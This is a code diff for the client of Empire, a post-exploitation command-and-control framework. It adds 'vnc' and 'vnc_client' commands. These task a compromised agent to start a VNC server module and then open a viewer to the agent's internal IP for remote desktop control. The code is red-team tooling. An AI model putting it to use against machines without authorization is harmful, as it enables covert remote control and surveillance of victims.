@@ -1,6 +1,8 @@
 import base64
 import os
+import subprocess
 import textwrap
+import time
 from typing import List
 
 from prompt_toolkit import HTML
@@ -10,7 +12,7 @@ from empire.client.src.EmpireCliState import state
 from empire.client.src.menus.Menu import Menu
 from empire.client.src.Shortcut import Shortcut
 from empire.client.src.ShortcutHandler import shortcut_handler
-from empire.client.src.utils import print_util, table_util
+from empire.client.src.utils import print_util, table_util, thread_util, vnc_util
 from empire.client.src.utils.autocomplete_util import (
     current_files,
     filtered_search_list,
@@ -513,6 +515,67 @@ class InteractMenu(Menu):
             )
         elif "error" in response.keys():
             print(print_util.color("[!] Error: " + response["error"]))
+
+    @command
+    def vnc_client(self, address: str, port: str, password: str) -> None:
+        """
+        Launch a VNC client to a remote server
+
+        Usage: vnc_client <address> <port> <password>
+        """
+        vnc_cmd = [
+            "python3",
+            state.install_path + "/src/utils/vnc_util.py",
+            address,
+            port,
+            password,
+        ]
+        self.vnc_proc = subprocess.Popen(
+            vnc_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
+
+    @command
+    def vnc(self) -> None:
+        """
+        Launch a VNC server on the agent and spawn a VNC client
+
+        Usage: vnc
+        """
+        module_options = dict.copy(state.modules["csharp/VNC/VNCServer"]["options"])
+        post_body = {}
+
+        for key, value in module_options.items():
+            post_body[key] = str(module_options[key]["Value"])
+
+        post_body["Agent"] = self.session_id
+
+        response = state.execute_module("csharp/VNC/VNCServer", post_body)
+        if "success" in response.keys():
+            print(
+                print_util.color(
+                    "[*] Tasked "
+                    + self.selected
+                    + " to run Task "
+                    + str(response["taskID"])
+                )
+            )
+        elif "error" in response.keys():
+            print(print_util.color("[!] Error: " + response["error"]))
+            return
+
+        print(print_util.color("[*] Starting VNC server..."))
+        time.sleep(5)
+
+        vnc_cmd = [
+            "python3",
+            state.install_path + "/src/utils/vnc_util.py",
+            self.agent_options["internal_ip"],
+            module_options["Port"]["Value"],
+            module_options["Password"]["Value"],
+        ]
+        self.vnc_proc = subprocess.Popen(
+            vnc_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        )
 
 
 interact_menu = InteractMenu()
